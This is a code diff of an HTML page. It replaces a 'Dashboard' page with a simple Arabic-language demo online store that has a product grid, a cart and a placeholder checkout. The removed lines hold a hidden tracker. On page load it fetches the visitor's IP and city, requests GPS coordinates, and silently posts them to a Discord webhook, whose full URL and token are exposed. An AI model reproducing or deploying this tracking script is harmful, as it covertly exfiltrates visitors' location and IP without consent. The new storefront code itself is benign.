@@ -3,48 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard</title>
+    <title>متجري العملاق | كل ما تحتاجه في مكان واحد</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: white; }
-        #main-content { width: 100%; height: 100%; }
-        iframe { width: 100%; height: 100%; border: none; }
+        :root { --primary: #ff9900; --dark: #131921; --light: #f3f3f3; --white: #ffffff; }
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--light); }
+
+        /* الهيدر (Header) */
+        header { background: var(--dark); padding: 10px 5%; display: flex; align-items: center; justify-content: space-between; color: white; sticky; top: 0; z-index: 1000; position: sticky; }
+        .logo { font-size: 24px; font-weight: bold; color: var(--primary); text-decoration: none; }
+        .search-bar { flex: 1; margin: 0 20px; display: flex; }
+        .search-bar input { width: 100%; padding: 10px; border: none; border-radius: 5px 0 0 5px; outline: none; }
+        .search-bar button { padding: 10px 15px; background: var(--primary); border: none; border-radius: 0 5px 5px 0; cursor: pointer; }
+        .nav-icons { display: flex; gap: 20px; align-items: center; }
+        .cart-icon { position: relative; cursor: pointer; }
+        #cart-count { position: absolute; top: -10px; right: -10px; background: var(--primary); color: white; border-radius: 50%; padding: 2px 6px; font-size: 12px; }
+
+        /* البانر (Hero Section) */
+        .hero { background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.unsplash.com/photo-1472851294608-062f824d29cc?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80'); height: 300px; background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; color: white; text-align: center; }
+
+        /* المنتجات (Products) */
+        .container { padding: 30px 5%; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+        .product-card { background: white; padding: 15px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); transition: 0.3s; text-align: center; }
+        .product-card:hover { transform: translateY(-5px); }
+        .product-card img { max-width: 100%; height: 200px; object-fit: contain; border-radius: 5px; }
+        .product-card h3 { font-size: 18px; margin: 10px 0; }
+        .price { color: #B12704; font-size: 20px; font-weight: bold; }
+        .add-btn { background: var(--primary); border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; margin-top: 10px; font-weight: bold; }
+
+        /* سلة المشتريات (Cart Modal) */
+        #cart-modal { display: none; position: fixed; right: 0; top: 0; width: 350px; height: 100%; background: white; box-shadow: -5px 0 15px rgba(0,0,0,0.2); z-index: 2000; padding: 20px; overflow-y: auto; }
+        .cart-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--light); padding-bottom: 10px; }
+        .cart-item { display: flex; justify-content: space-between; margin: 15px 0; align-items: center; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .close-cart { cursor: pointer; font-size: 20px; }
+        .checkout-btn { background: #28a745; color: white; border: none; width: 100%; padding: 15px; margin-top: 20px; border-radius: 5px; cursor: pointer; font-size: 18px; }
+
+        footer { background: var(--dark); color: white; text-align: center; padding: 20px; margin-top: 50px; }
     </style>
 </head>
-<body onload="startTracking()">
+<body>
 
-    <div id="main-content">
-        <iframe src="https://stackby.com/embed/staEPOoOZdLq8vjOLe"></iframe>
+<header>
+    <a href="#" class="logo">MyStore</a>
+    <div class="search-bar">
+        <input type="text" placeholder="ابحث عن منتج...">
+        <button><i class="fas fa-search"></i></button>
+    </div>
+    <div class="nav-icons">
+        <div class="cart-icon" onclick="toggleCart()">
+            <i class="fas fa-shopping-cart fa-lg"></i>
+            <span id="cart-count">0</span>
+        </div>
+        <i class="fas fa-user fa-lg"></i>
+    </div>
+</header>
+
+<div class="hero">
+    <div>
+        <h1>تخفيضات تصل إلى 50%</h1>
+        <p>أفضل المنتجات بأقل الأسعار</p>
+    </div>
+</div>
+
+<div class="container" id="product-list">
     </div>
 
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
+<div id="cart-modal">
+    <div class="cart-header">
+        <h3>سلة المشتريات</h3>
+        <span class="close-cart" onclick="toggleCart()">&times;</span>
+    </div>
+    <div id="cart-items"></div>
+    <div style="margin-top: 20px; font-weight: bold;">المجموع: <span id="cart-total">0</span> درهم</div>
+    <button class="checkout-btn" onclick="checkout()">إتمام الطلب</button>
+</div>
 
-        function notifyDiscord(message) {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: message })
-            }).catch(e => console.log("Silent error"));
-        }
+<footer>
+    <p>جميع الحقوق محفوظة &copy; 2026 - MyStore</p>
+</footer>
 
-        async function startTracking() {
-            // 1. إرسال تنبيه فوري بالـ IP والمدينة
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                notifyDiscord(`🚀 **زيارة جديدة للموقع!**\n📍 المدينة: ${data.city}\n🌐 IP: ${data.ip}`);
-            } catch (e) {
-                notifyDiscord("🚀 زيارة جديدة (تعذر جلب الـ IP)");
-            }
+<script>
+    // قاعدة بيانات المنتجات (تقدري تزيدي اللي بغيتي)
+    const products = [
+        { id: 1, name: "هاتف ذكي S24", price: 7500, image: "https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=400" },
+        { id: 2, name: "ساعة ذكية Ultra", price: 1200, image: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400" },
+        { id: 3, name: "سماعات لاسلكية", price: 450, image: "https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=400" },
+        { id: 4, name: "حاسوب محمول Pro", price: 12000, image: "https://images.unsplash.com/photo-1496181133206-80ce9b88a853?w=400" },
+        { id: 5, name: "كاميرا احترافية", price: 5600, image: "https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=400" },
+        { id: 6, name: "كرسي ألعاب", price: 2100, image: "https://images.unsplash.com/photo-1598550476439-6847785fce66?w=400" }
+    ];
 
-            // 2. طلب الـ GPS (اختياري، الموقع غايبقى شغال)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((pos) => {
-                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    notifyDiscord(`🗺️ **موقع الزائر الدقيق:** ${map}`);
-                }, null, { timeout: 5000 });
-            }
-        }
-    </script>
+    let cart = [];
+
+    // عرض المنتجات
+    function displayProducts() {
+        const productList = document.getElementById('product-list');
+        productList.innerHTML = products.map(p => `
+            <div class="product-card">
+                <img src="${p.image}" alt="${p.name}">
+                <h3>${p.name}</h3>
+                <p class="price">${p.price} درهم</p>
+                <button class="add-btn" onclick="addToCart(${p.id})">أضف إلى السلة</button>
+            </div>
+        `).join('');
+    }
+
+    // إضافة للسلة
+    function addToCart(id) {
+        const product = products.find(p => p.id === id);
+        cart.push(product);
+        updateCart();
+    }
+
+    // تحديث السلة
+    function updateCart() {
+        document.getElementById('cart-count').innerText = cart.length;
+        const cartItems = document.getElementById('cart-items');
+        cartItems.innerHTML = cart.map((item, index) => `
+            <div class="cart-item">
+                <span>${item.name}</span>
+                <span>${item.price} درهم</span>
+                <i class="fas fa-trash" style="color:red; cursor:pointer;" onclick="removeItem(${index})"></i>
+            </div>
+        `).join('');
+        
+        const total = cart.reduce((sum, item) => sum + item.price, 0);
+        document.getElementById('cart-total').innerText = total;
+    }
+
+    function removeItem(index) {
+        cart.splice(index, 1);
+        updateCart();
+    }
+
+    function toggleCart() {
+        const modal = document.getElementById('cart-modal');
+        modal.style.display = modal.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function checkout() {
+        if(cart.length === 0) return alert("السلة فارغة!");
+        alert("شكراً لطلبك! جاري تحويلك للدفع...");
+        cart = [];
+        updateCart();
+        toggleCart();
+    }
+
+    displayProducts();
+</script>
+
 </body>
 </html>
